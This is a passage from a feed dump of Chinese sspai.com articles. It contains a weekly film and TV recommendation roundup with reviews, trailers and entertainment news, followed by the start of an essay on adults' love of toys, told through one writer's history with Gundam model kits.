并不能够做到比较完美的还原。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/71157"},{"title":"本周看什么丨最近值得一看的 7 部作品","date":"2022-02-18 11:07:00","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[英剧] 疼痛难免、[电影] 蜡笔小新：谜案！花之天春学园、[日剧] 镰仓殿的 13 人、[纪录片] Tinder 诈骗王、[英剧] 喜鹊谋杀案、[动画] 食锈末世录、[动画] 机械之声的传奇 第一季</li>\n<li>几则精彩预告：《奇异博士 2：疯狂多元宇宙》发布全新官方中字预告、漫改 TV 动画《鬼灭之刃 锻刀村篇》公布先导预告、《指环王：统御魔戒》公布先导预告，9 月 2 日上线、电影《奇奇与蒂蒂：救难小福星》公布预告，5 月 20 日上线</li>\n<li>几则影视资讯：电影《新蝙蝠侠》确认引进，内地定档 3 月 18 日、汤姆·霍兰德主演电影《神秘海域》3 月 14 日中国内地上映、菅田将晖、有村架纯主演电影《花束般的恋爱》中国内地定档 2 月 22 日、雷德利·斯科特或将执导剧集《银翼杀手 2099》、漫改 TV 动画《咒术回战》将制作第二季</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[英剧] 疼痛难免</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/40b321d99d518c2155eba510d0f10564.png\"></figure><p>关键词：医疗 / 剧情 / 同性</p>\n<p>片长：47 分钟 × 7 集；<a href=\"https://movie.douban.com/subject/30267255/\">豆瓣链接</a></p>\n<blockquote><p>就像是自己不停地在救火，但根本没有趁手的工具。</p></blockquote>\n<p>@利兹与青鸟：本剧由 Adam Kay 的同名日记式回忆录改编，以主角 Adam 在公立医院妇产科的实习为主线，辅以有关他爱情、亲情、友情的碎片让人物更加立体。剧中还展示了公立医院的忙碌，几乎没有安静的时刻、没有一件能穿的衣服、压力大到呕吐、随时都能睡着；有对剖腹产画面真实而血淋淋的展示，使人胆战心惊；有令人啼笑皆非的病例，但同样也有感人至深、催人泪下的故事；剧中还涉及了种族歧视、家暴、医患关系、医疗体制等社会议题，并通过交叉剪辑对公立和私立医院进行了鲜明对比和讽刺，颇具现实主义色彩。</p>\n<p>本剧饱有英剧的一贯特色，毒舌的角色、打破「第四堵墙」和观众对话、句句带梗的台词，虽然因为文化差异不可能看懂所有梗，但总有能戳到观众的点，比如来自《洛基恐怖秀》的 Transylvania；还有好听又应景的歌曲，比如在担心棉签是不是在手术时落在患者肚子里时响起的《Trouble - Ray LaMontagne》。即使你不是主演本·卫肖的粉丝，或是对医疗题材兴趣寥寥，这部剧所表现出的打工人的辛酸、 007 的压力、不被理解的孤独、无法摆脱的梦魇、对生活失去希望的时刻，总有一个瞬间会让你不禁发出「世另我」的感叹。</p>\n<h3>[电影] 蜡笔小新：谜案！花之天春学园</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/1802f2a3e8494cc2b9d7fe36f6843148.png\"></figure><p>关键词：校园 / 推理 / 喜剧</p>\n<p>片长：104 分钟；<a href=\"https://movie.douban.com/subject/35286583/\">豆瓣链接</a></p>\n<blockquote><p>对孩子们来说，「无意义」也是必不可少的。</p></blockquote>\n<p>@SHY：受到风间邀请，小新和其他小伙伴们来到了封闭式管理的「私立天下统一春日部学园」，进行为期一周的入学体验。天春学园奉行精英主义，致力于提升学生的个性和能力，更开发了 AI 中枢系统，对所有人的表现进行综合记录，并量化为精英点数。得分越高的学生，待遇也越优渥，享受最好的学习和生活条件；反之，被扣分最多的问题学生则会被抛弃，丢到垃圾班级放任自流。</p>\n<p>为了在入学体验中积攒足够的精英点数，获得特招入学的资格，风间一心好好表现，却总是被小新拖累，分数不断降低。眼看离目标越来越远，恨铁不成钢的风间愤然与小新绝交，打算一个人踏上精英之路。然而，独自离开的他却被学园传说中的「吸屁股鬼」袭击，变成了彻头彻尾的笨蛋。为了查明真相，小新等人组成侦探俱乐部，走访嫌疑人员，展开实地勘查，誓要将凶手抓捕归案。</p>\n<p>虽然探案过程搞笑又整蛊，但《谜案！花之天春学园》的谜题设置相当有趣，关键线索也如数给出。无厘头的设定下逻辑自洽，揭晓真相时出人意料又在情理之中，甚至可以称得上本格推理。更值得称道的，是本作试图探讨的主题。对近来再度引起热议的「精英教育」的反思，对阶级分层和社会达尔文主义的讥讽，赋予了它更深层次的现实意义，使其不止于一部子供向动画，成为能够雅俗共赏的群像佳作。</p>\n<h3>[日剧] 镰仓殿的 13 人</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/d1b61ef8cbe970017179b22e61a3bf39.png\"></figure><p>关键词：历史</p>\n<p>片长：45 分钟（单集）× 50 集；<a href=\"https://movie.douban.com/subject/34941578/\">豆瓣链接</a></p>\n<blockquote><p>三谷幸喜笔下喜剧风的大河剧。</p></blockquote>\n<p>@潘誉晗：北条义时出身伊豆国的大豪族，由于姐姐和因平治之乱被流放到伊豆的源赖朝成婚，他的命运也发生了改变。他跟着义兄源赖朝学习，也因此成长为镰仓幕府的第二代执权人。而所谓的「镰仓殿的 13 人」，是指源赖朝去世之后成立的十三人合议制。</p>\n<p>NHK 电视台自 1963 年起每年制作一档长篇历史连续剧已经是惯例了，每一次的电视剧都会以战国时期或是幕末故事作为主要题材，亦或是历史小说，总的来说是非常适合历史爱好者观看的剧集。日本习惯把这种电视剧称为大河剧，也是很多日本观众特别重视的一部剧。而今年的大河剧，则围绕日本平安时代末期至镰仓时代初期的政治家北条义时展开，主人公由小栗旬饰演。除了大泉洋、新垣结衣、宫泽理惠、小池荣子、菅田将晖等华丽的助演之外，担任旁白的长泽雅美和非常有个人特色的编剧三谷幸喜也令人惊喜。大概也是因为这样，这次的大河剧，少了过于厚重的沉闷感，诙谐的剧情让对历史不怎么感冒的人也能看下去。</p>\n<h3>[纪录片] Tinder 诈骗王</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/277a1201ff666e38885d064853dae735.png\"></figure><p>关键词：纪录片 / 犯罪</p>\n<p>片长：114 分钟；<a href=\"https://movie.douban.com/subject/35732660/\">豆瓣链接</a></p>\n<blockquote><p>反杀「杀猪盘」，但结局？</p></blockquote>\n<p>@甜約翰：「杀猪盘」、海王、庞氏骗局……由 Netflix 出品、《别惹猫咪：追捕虐猫者》制作团队打造的纪录片《Tinder 诈骗王》讲述了发生在交友软件「Tinder」上的诈骗故事：软件上，赛门-列维夫拥有私人飞机，出入奢华酒店，天天世界各地参加派对，是身价上亿美元的的钻石大亨之子；现实中，他却是伪造支票、护照，曾因诈骗入狱三年的西蒙-列维耶夫。于是，发现受到欺诈的三位受害者决定联起手来讨回公道。</p>\n<p>最终，西蒙-列维耶夫被判处 15 个月监禁，但因为疫情的缘故，他只坐了 5 个月的牢就保释出狱。不过更讽刺的是，出狱后的西蒙-列维耶夫不仅凭借纪录片的热度涨了一波粉，继续活跃在社交媒体上，而且还创立了个人网站提供付费商业咨询，更有消息称他已经签约好莱坞经纪公司，准备制作相亲真人秀。另一方面，纪录片中的三位受害者，她们不得不要继续偿还债务，甚至遭受了网络暴力，被贴上「拜金」等标签。而这一事件背后，关于人性、社交媒体、网络交友、情感寄托、「完美受害者」等问题同样值得我们思考。</p>\n<h3>[英剧] 喜鹊谋杀案</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/ee6639b5138c91d929d6319cc0dd370d.png\"></figure><p>关键词：剧情 / 悬疑 / 犯罪</p>\n<p>片长：45 分钟（单集）× 6 集；<a href=\"https://movie.douban.com/subject/35154761/\">豆瓣链接</a></p>\n<blockquote><p>我们不需要看书了，我们就是书！</p></blockquote>\n<p>@潘誉晗：资深编辑苏珊·赖兰负责的著名推理小说家艾伦·康威写出过八本超级畅销的系列作品，可当她拿到艾伦的第九本小说《喜鹊谋杀案》时，她才发现手里的初稿残缺了，还偏偏是揭露真凶是谁的最后一章。也正是在这时，艾伦在自己的庄园意外去世。是自杀，还是谋杀？当苏珊寻找失踪的手稿时，她发现了原来在这次事件的背后，竟然还隐藏着另一个秘密。</p>\n<p>本剧根据著名推理小说家安东尼·霍洛维茨的同名小说改编。原著本身就极富盛名，上市那一年还获得了《华盛顿邮报》的年度最佳小说，而这一次改编的六集迷你剧，也是相当出色。双线并行的案中案结构在虚构故事和现实生活中互相穿插着，优秀的镜头切换，配合出色的拍摄手法和明快的配乐，整部剧不仅给观众良好的观看体验，也可以作为同类剧的优秀拍摄范本。剧情紧凑不累赘，同批演员更是能完美消化在不同线索中扮演不同角色的设定，线索也不像以往推理剧一样暗藏着，而是明明白白、大大方方地来，这让最后结局显得合情又合理。</p>\n<h3>[动画] 食锈末世录</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/f8556f67bec461e4f5f338984e820575.png\"></figure><p>关键词：小说改 / 剧情 / 科幻 / 冒险</p>\n<p>片长：24 分钟（单集）× 12 集，每周一更新</p>\n<p>观看渠道：<a href=\"https://www.youtube.com/playlist?list=PLuxqoToY7Ucga1uoBRzvV1VrhIT99JqBR\">YouTube</a> / <a href=\"https://www.bilibili.com/bangumi/media/md28236421/\">哔哩哔哩港澳台</a>；<a href=\"https://movie.douban.com/subject/35390510/\">豆瓣链接</a></p>\n<p>读原著：<a href=\"https://book.douban.com/series/60457\">KADOKAWA</a> / <a href=\"https://book.douban.com/series/60456\">台湾角川</a></p>\n<blockquote><p>人心至今，依旧不锈。</p></blockquote>\n<p>@SHY：以东京爆炸洞为中心，能够侵蚀一切生命和事物的「锈蚀之风」吹遍日本全境，所及之处，寸草不生，将文明破坏殆尽。曾经繁荣的都市退化为荒漠，残存的人类在各县边界筑起防风高墙，龟缩于一个个围城。传闻中会散播引起锈蚀的蕈菇，为人忌惮的少年赤星毕斯可，与貌美的医师同伴猫柳美禄，为了拯救患上不治之症的各自所爱之人，携手踏上寻找能净化锈蚀的灵药「食锈」的旅程。</p>\n<p>虽然体裁是轻小说，但《食锈末世录》原著的世界观设定和剧情框架都更像是热血少年漫画。渺无人烟的埼玉铁沙漠、防卫兵器残骸上搭建的城镇、大章鱼盘踞的废弃地下铁路网络……从蜗牛轰炸机到犀牛自走炮，旧时代的科技文明遗迹与野蛮成长的变异生物混搭，呈现了别具一格的末世废土朋克。乘上通晓人性的巨型螃蟹芥川，以必中蕈菇箭贯穿所有威胁，与未知的前方邂逅，疾风怒涛的王道冒险剧就此开幕。</p>\n<p>有制片人须田泰雄牵线，本作与《<a href=\"https://movie.douban.com/subject/34456027/\">异度侵入 ID:INVADED</a>》基本采用了同款班底，还把编剧舞城王太郎请来当 OP・ED 分镜，作画虽无亮点，但还算稳定。导演碇谷敦初次执导 TV 动画，连原画、作监、人设都亲自上阵，可惜前几集的多线叙事没把握好，演出尚欠火候，但新颖的世界观仍具有吸引力。倒是制作公司 NAZ 知道自己名声臭，特意注册个马甲叫 OZ，再把自己标成「制作协力」，不嫌麻烦么……</p>\n<h3>[动画] 机械之声的传奇 第一季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/91e9541a47b28cb378a1c45977a170b5.png\"></figure><p>关键词：喜剧 / 动作 / 奇幻 / 冒险</p>\n<p>片长：25 分钟（单集）× 12 集；<a href=\"https://movie.douban.com/subject/34902572/\">豆瓣链接</a></p>\n<blockquote><p>辣鸡跑团帮的逆袭。</p></blockquote>\n<p>@潘誉晗：各司其职的七位能人异士组成了名为「机械之声」的跑团帮，虽然一开始的时候看似非常不靠谱，喝酒、泡妞、胆小、无脑……可当真的面对危难的时候，七人间的彼此信任让他们团结在一起。解决了蓝龙危机之后，他们成为了「国度守护者」，以及陶多瑞王国的荣誉成员，可这场属于他们的传奇才刚刚开始，未来还有更多的危险在等待着他们。</p>\n<p>这部动画起源于《龙与地下城》著名主持人的跑团直播系列中的一个战役，参战的队伍名称是「机械之声」，动画也因此得名。宣布制作成动画的时候是在网络上用众筹的方式公布的，结果短短几个小时就轻松筹到了几百万的资金，远超预期的 75 万美元。大概也是因为这个原因，动画播出之后在烂番茄获得了 100% 的新鲜度，并且成功续订了第二季。</p>\n<p>动画的人设做得还是很成功的，七人七色，有着各自的魅力，但是走在一起又有着凝聚的团队力量感。虽然是根据游戏进行的改编，但是整体的故事性做得还是很不错的。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35391188/\">[韩剧] 气象厅的人们：社内恋爱残酷史篇</a> @潘誉晗：网飞刚推出的这部办公室恋爱小甜剧的口碑和收视都很不错，故事主要讲述气象厅总管二部的年轻预报员李时雨（宋江饰）和直系科长陈夏京（朴敏英饰）的社内姐弟恋。大概是因为办公室恋情加上气象局，还真是有种爱情阴晴不定的味道。吻戏来得就像龙卷风，怼起前任也可以拿出暴风雨的气势～</p>\n<p><a href=\"https://movie.douban.com/subject/34951614/\">[英剧] 娃娃脸 第二季</a> @潘誉晗：因为曾经的恋爱脑让自己沉浸于见色忘友的境地，被痛甩后的 Jules 决心重新找回自己的生活，也重拾起和闺蜜之间的友谊。hulu 家的小妞剧，主演是观众熟悉的 Max。在这一季的故事中，除了音乐比第一季更加优秀之外，闺蜜之间友情的加重刻画也增加了不少新的看点，是适合周末和姐妹一起看的剧集，轻松又明亮～</p>\n<p><a href=\"https://movie.douban.com/subject/35341388/\">[台剧] 我家浴缸的二三事</a> @潘誉晗：校园边缘人的高中生赵龙杰被一条「美男鱼」缠上，只有在他家浴缸才能恢复鱼尾的李仁宇脾气可不好，可为了寻找回到大海的方法，两人不得不同居在一起。台湾新出的这部清新向的同性剧改编自同名日漫，本剧本土化做得挺好，虽然还是有夸张的部分，但本身的设定走的是奇幻、喜剧的路线，所以很好玩。</p>\n<p><a href=\"https://movie.douban.com/subject/35712778/\">[综艺] 山友都市女人们 </a>@潘誉晗：《酒鬼都市女人们》的李善彬、郑恩地和韩善花三位女主角再一次聚集起来，进行一场只有女生们的旅行。疫情没办法走太远，那就爬山好了，虽然走得很慢，但是一路上姐妹们嘻嘻哈哈的还是很开心。到达目的地就吃一份泡面，虽然简单，但已足够心满意足。综艺很轻松，喜欢剧集的小伙伴们不要错过。</p>\n<h2>📅 本周新预告</h2>\n<h3>《奇异博士 2：疯狂多元宇宙》发布全新官方中字预告</h3> <p>2 月 14 日，《奇异博士 2：疯狂多元宇宙》发布全新预告。该片由山姆·雷米执导，本尼迪克特·康伯巴奇、伊丽莎白·奥尔森、瑞秋·麦克亚当斯、本尼迪克特·王、切瓦特·埃加福、克索斯利尔·戈麦斯等主演，将于 5 月 6 日北美上映。</p>\n<h3>漫改 TV 动画《鬼灭之刃 锻刀村篇》公布先导预告</h3> <p>2 月 13 日，漫改 TV 动画《鬼灭之刃 花街篇》最终回播出，同时宣布将制作续集《鬼灭之刃 锻刀村篇》，并公布了先导预告和视觉图，播出时间待定。本作改编自吾峠呼世晴的同名漫画，承接第二季结尾，讲述吉原任务后灶门炭治郎等人的新冒险。</p>\n<h3>《指环王：统御魔戒》公布先导预告，9 月 2 日上线</h3> <p>2 月 14 日，奇幻巨制《指环王：统御魔戒》公布了首支先导预告，首季共 8 集，将于 9 月 2 日上线 Amazon Prime Video。本作由 J·A·巴亚纳等执导，罗伯特·阿拉马约、奥文·亚瑟、纳赞宁·波妮阿蒂等主演，设定于电影版三千年前的第二纪元，成本达 4.65 亿美元，为史上最贵美剧。</p>\n<h3>电影《奇奇与蒂蒂：救难小福星》公布预告，5 月 20 日上线</h3> <p>2 月 15 日，迪士尼公布了真人+动画电影《奇奇与蒂蒂：救难小福星》的先导预告，将于 5 月 20 日上线 Disney+。本作系同名经典动画剧集重启，由阿吉瓦·沙弗尔执导，原作完结 30 年后，奇奇成为保险推销员，蒂蒂则通过「CG 特效手术」变身 3D 角色，当一位同伴神秘失踪时，他们必须修补破碎的友情。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1tm4y1d7Mc\" target=\"_blank\"><strong>漫改 TV 动画《夏日重现》公布新预告，4 月 14 日开始播出：</strong></a>漫改 TV 动画《夏日重现》公布了主题曲预告，共 25 集，将于 4 月 14 日开始播出，并独家上线 Disney+。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1T341177NQ?spm_id_from=333.999.0.0\" target=\"_blank\"><strong>《唐顿庄园：新纪元》发布繁体中字预告：</strong></a>由西蒙·柯蒂斯执导，米歇尔·道克瑞、玛吉·史密斯、休·博纳维尔等原班卡司主演的《唐顿庄园：新纪元》发布繁体中字预告。该片将于 5 月 20 日北美上映，4 月 29 日英国上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1zZ4y1R7EA?spm_id_from=333.999.0.0\" target=\"_blank\"><strong>漫威新剧《月光骑士》发布全新预告，3 月 30 日上线 Disney+：</strong></a>漫威新剧《月光骑士》发布新电视预告。本剧由奥斯卡·伊萨克、伊桑·霍克、加斯帕德·尤利尔等主演，将于 3 月 30 日上线 Disney+。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1u34y1C7RA\" target=\"_blank\"><strong>动画电影《名侦探柯南：万圣节的新娘》新预告：</strong></a>满仲劝执导，大仓崇裕编剧，以涩谷为舞台，高木、佐藤警官和安室透将大展身手，4 月 15 日在日本上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Z5411o7TD\" target=\"_blank\"><strong>动画剧集《黑袍纠察队：劣迹》 ：</strong></a>同名真人美剧衍生动画，由八个风格迥异的超级英雄故事组成，3 月 4 日上线 Amazon Prime Video。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>电影《新蝙蝠侠》确认引进，内地定档 3 月 18 日</h3>\n<p>2 月 17 日，华纳兄弟影业宣布电影《新蝙蝠侠》定档 3 月 18 日全国上映。本作由马特·里夫斯执导，罗伯特·帕丁森饰演「蝙蝠侠」布鲁斯·韦恩，佐伊·克罗维兹、保罗·达诺、科林·法瑞尔等主演，猫女、谜语人、企鹅人等悉数登场，哥谭危机四伏，真相扑朔迷离，将于 3 月 4 日登陆北美院线。</p> <h3>汤姆·霍兰德主演电影《神秘海域》3 月 14 日中国内地上映</h3>\n<p>2 月 17 日，汤姆·赫兰德、马克·沃尔伯格、安东尼奥·班德拉斯等主演的电影《神秘海域》发布定档预告，3 月 14 日中国内地上映。该片改编自 PlayStation 经典游戏，由《毒液：致命守护者》导演鲁本·弗雷斯彻执导。</p> <h3>菅田将晖、有村架纯主演电影《花束般的恋爱》中国内地定档 2 月 22 日</h3>\n<p>2 月 17 日，日本爱情电影《花束般的恋爱》确认引进中国内地，将于 2 月 22 日上映。该片由土井裕泰执导，坂元裕二编剧，菅田将晖、有村架纯主演，讲述男女主人公因错过末班电车而偶然相识之后展开的恋爱故事。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/18/article/6d763e7437cb089ef88d101391d91e17\"></figure><h3>雷德利·斯科特或将执导剧集《银翼杀手 2099》</h3>\n<p>2 月 11 日，外媒 Deadline 独家报道称，亚马逊工作室正在开发真人剧集《银翼杀手 2099》，设定在电影《银翼杀手 2049》的 50 年后，由 Alcon Entertainment 和 Scott Free Productions 制作，1982 年原版电影导演雷德利·斯科特将担任执行制片人，并可能亲自执导。 <a href=\"https://deadline.com/2022/02/blade-runner-2099-sequel-series-ridley-scott-amazon-1234931521/\" target=\"_blank\">来源</a></p>\n<h3>漫改 TV 动画《咒术回战》将制作第二季</h3>\n<p>2 月 12 日，漫改 TV 动画《咒术回战》宣布将制作第二季，预定 2023 年开始播出。本作改编自芥见下下的同名漫画，朴性厚执导，MAPPA 制作，讲述吞下被诅咒的两面宿傩之指的少年虎杖悠仁，转入东京都立咒术高等专门学校后的冒险。 <a href=\"https://twitter.com/animejujutsu/status/1492434543193718786\" target=\"_blank\">来源</a></p>\n<h3>更多</h3>\n<p><strong>Netflix 将推出《生化奇兵》真人电影：</strong>2 月 16 日，Netflix 宣布，其正在与 2K 和 Take-Two Interactive 合作，将经典游戏系列《生化奇兵》搬上银幕，具体上线时间待定。据 The Hollywood Reporter 报道，项目目前处于早期阶段，由 Vertigo Entertainment 制作，但尚未确定编剧和制片人选。 <a href=\"https://twitter.com/NetflixGeeked/status/1493631216788066310\" target=\"_blank\">来源</a></p>\n<p><strong>《浴血黑帮》第六季 2 月 27 日正式开播：</strong>《浴血黑帮》第六季宣布将于 2 月 27 日正式开播。本季为最终季，由基里安·墨菲、保罗·安德森、山姆·克拉弗林、芬恩·科尔、汤姆·哈迪、海伦·麦克洛瑞、安雅·泰勒-乔伊、布莱恩·格里森、斯蒂芬·格拉汉姆等出演。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/18/article/2367ddef9075d4d8cc4a4921cf6e8a14\"></figure><p><strong>《星际迷航 4》确认开发，预计将于今年年底开拍：</strong>2 月 16 日，派拉蒙影业宣布《星际迷航 4》正在筹备中，预计将于今年年底开拍。该片由《旺达幻视》导演马特·沙克曼执导，已定档 2023 年 12 月 22 日北美上映。</p>\n<p><strong>庵野秀明推出「新·日本·英雄·宇宙」：</strong>东宝 × Khara × 圆谷 × 东映联合打造，《新·哥斯拉》《福音战士新剧场版》《新·奥特曼》《新·假面骑士》四部作品联动，企划内容将于后续公开。 <a href=\"https://sjhu.jp/news/1/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/3c5c915d831e16e39e95a795817f4019.jpg\"></figure><h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/479250d2013638cc57f89a609b41fd9e.png\"></figure><p>本期的彩蛋是由中奖读者 <a class=\"ss-atUser\" data-mention=\"@SHY\" user-id=\"bs2p0otb34tch278usc0\" href=\"https://sspai.com/u/wangshy\">@SHY</a> 提供的「看图猜电影」，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/2e67850f4623337cb2852d3903f869e8.png\"></figure><p>🎁 本期彩蛋还有一道附加题，由中奖读者 <a class=\"ss-atUser\" data-mention=\"@青鸾游子\" user-id=\"bs2p20tb34tch279b77g\" href=\"https://sspai.com/u/gehv1zym\">@青鸾游子</a> 提供。答对的朋友除了彩蛋提供名额，还可获得少数派 2022 虎年水獭红包封面🧧！本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、影片推荐…… 更多精彩尽在 <a href=\"https://sspai.com/page/2021/movie\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n","link":"https://sspai.com/post/71525"},{"title":"成年人的玩具梦：Why Adults Play？","date":"2022-02-18 07:53:19","description":"\n<p>不知道你有没有在超市见到过这样的情况：孩子含着热泪想要让父母给自己买一款喜欢的玩具。作为成年人的我们，也许早已忘了自己当初对玩具的渴望。其实，在我们身边总会有这样的朋友，他们对玩具有着自己的执着，即使不被他人理解，依然坚持自己的热爱。</p>\n<p>在这篇文章中，我们请到了 4 位喜爱不同类型玩具的创作者来分享自己与玩具的故事。带大家走进他们，从成年人的角度聊聊玩具对于他们来说意味着什么。</p>\n<h2>第一章：少年的机器人梦</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/article/7c2e300dd63519087f1161aea0bef34f\"></figure><h3>我和高达模型的故事</h3>\n<p>我和高达模型的故事说起来有些长，但总结起来倒是可以用「少年时的执念，终于在后来得以实现」来形容。</p>\n<p>如果有留意过少数派 2020 年度征文的话，相信你对我写的《<a href=\"https://sspai.com/post/64570\" target=\"_blank\">高达模型不完全入坑指南</a>》应该有点印象。事实上，我入坑高达模型的时间并不长。第一次接触高达模型是小学的时候，那时小区便利店的货架上总是琳琅满目地堆放着各种玩具，其中 BB 战士三国系列的高达模型是我当时的心头好。</p>\n<ul><li>关联阅读：会员文章《<a href=\"https://sspai.com/prime/story/vol6-model-toy-guide\" target=\"_blank\">大人的玩具：成品模型入坑指南</a>》</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/article/9299174f453554ad4e0fcf9dabc8579c\"><figcaption>BB 战士 刘备高达（图 / 78 动漫）</figcaption></figure><p>现在回想起来，那时候买 BB 战士主要的原因，可能那时候表哥跟我说过，买高达要看准「BANDAI」标，那个才是正版的。而小卖部里只有 BB 战士系列的高达是万代的，其他都是各种国产品牌的盗版产品。</p>\n<p>因此，我当时对高达模型的印象，只停留在 SD 系列那种 3 头身的 Q 版比例。直到后来我在同学家看到了一台 MG 强袭自由，我才第一次发现正比例的高达居然可以这么帅。当时心里想的是，这么大的高达一定很贵吧，再加上我本身性格内向，也不太愿意跟父母提这件事。于是我从未获得过一台正比例的高达。</p>\n<p>久而久之，想买高达的事情似乎就被我遗忘了。</p>\n<p>时间来到了 2019 年，因为抑郁症的关系我申请了休学。在家休息的时间里，有天晚上在 B 站刷到了 <a href=\"https://space.bilibili.com/2029306\">@-评头论足-</a> 的一期高达模型视频，抱着好奇的心态看完后，儿时对高达模型的向往瞬间涌上心头。由于当时在少数派写稿已经有了一些收入，我就在淘宝试着搜了一下。发现一台 RG 的强袭自由居然只要 ¥170+（当我真正入坑以后才发现，其实我还是买贵了🌝）。于是我毫不犹豫地就下单了，收到模型的当天，我就花了一下午时间把它给拼完了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/5861c5051a052324b4948b1437ace1fe.jpg\"><figcaption>我的第一台高达模型：RG 强袭自由高达</figcaption></figure><p>那时我还不知道拼高达需要什么剪钳、笔刀，全程就用剪刀和指甲剪拼完了一台 RG 强袭自由。现在回想起来，其实也挺佩服自己的。因为 RG 的零件又多又小，再加上剪刀取件非常硌手，拼完之后手指足足痛了两天。但看着一堆零件逐渐变成一台高达的过程，确实让当时的我心里尤为激动。</p>\n<p>虽然那台 RG 强袭自由的关节很软，还总爱掉件，但它依然让我喜欢了很长时间。后来，我又陆续拼了 MG 嫣红强袭、RG 独角兽等高达模型，也入手了一套便宜但趁手的拼装工具，掉进了高达模型这个坑。</p>\n<p>随着 2020 年高达中国计划的开启，国内高达模型市场也变得混乱起来，我们很难再以合适的价格买到刚发售的模型。有些时候，你甚至连预定的名额都抢不到。于是我对高达模型的热情也消退了不少，我仍会关注新品资讯，但只会去入手那些自己喜欢的模型，对于一些热门产品，我更多的还是选择放弃。</p>\n<p>作为成年人，我能够理解逐利的本性；但作为玩家，我宁愿等热度降下来以后再去入手自己喜欢的模型，也不想给这些人送钱。</p>\n<h3>为什么喜欢高达模型</h3>\n<p>我对高达模型的喜爱，除了前文提到的「年少的执念」外，更多的还是享受拼装的过程。拼装的时候，我通常会把自己关在房间里，放上喜欢的音乐，把自己放空。在这种状态下，我总能忘记时间，一口气拼上很久，虽然容易腰酸背痛，但是感觉精神上却能得到很好的休息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/b95be3b500502229b5394f28ca0990c2.gif\"></figure><p>除了拼装的过程外，把玩成品的乐趣也是我喜欢高达模型的原因。毕竟哪个孩子不曾幻想过，驾驶心爱的高达在宇宙中酣战呢？当我将高达模型摆出一个又一个姿势的时候，仿佛自己钻进了驾驶舱，操纵着这台高达在桌面上征战。</p>\n<p>因此，我也并不只买拼装高达，有时候也会入手 Robot 魂这样的成品模型来专门把玩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/ed2215ae16f8b673580e2b8691b5c917.jpeg\"><figcaption>Robot 魂 NT-1 与 Robot 魂 扎古 II FZ（图 / 我自己）</figcaption></figure><p>喜欢一件事物是个持续的过程，我似乎很难找到一个明确的点来描述自己对高达模型的喜爱，因为它有很多吸引着我的地方。我想，「喜欢」这件事本身，就是它所存在的理由与意义。</p>\n<h3>高达模型带来了什么</h3>\n<p>在入坑高达模型之前，我算是一个没有爱好的人。当我遇到无法排解的压力时，就找不到可以释放的窗口。入坑高达模型后，我似乎找到了这个可以让我放空自己的窗口，并且随着「爱好」的出现，我可以把一些时间、精力分配出去，让自己从当时的阴郁中得以解脱。</p>\n<p>因为我喜欢给自己的高达模型拍照，在一些照片分享社区发布的照片也收获了不少好评。通过爱好获得的「认同感」，我想也是高达模型所带给我的，难以替代的收获吧。</p>\n<h3>那些不理解的声音</h3>\n<p>作为一个相对小众的文化，高达模型自然也会遭到许多人（尤其是长辈）的不理解。在他们眼中，一个二十几岁的人还在花那么多钱玩「变形金刚」，在房间里摆得满满当当，多少有点「不务正业」。这是必然的事，也正是因此，我们才需要与他们有更多的沟通，让他们知道自己对高达模型的喜爱，以及它给自己带来的意义。</p>\n<p>幸运的是，我的父母非常开明，尽管他们起初对我突然开始玩高达模型也有过疑惑。但在我与他们的沟通、让他们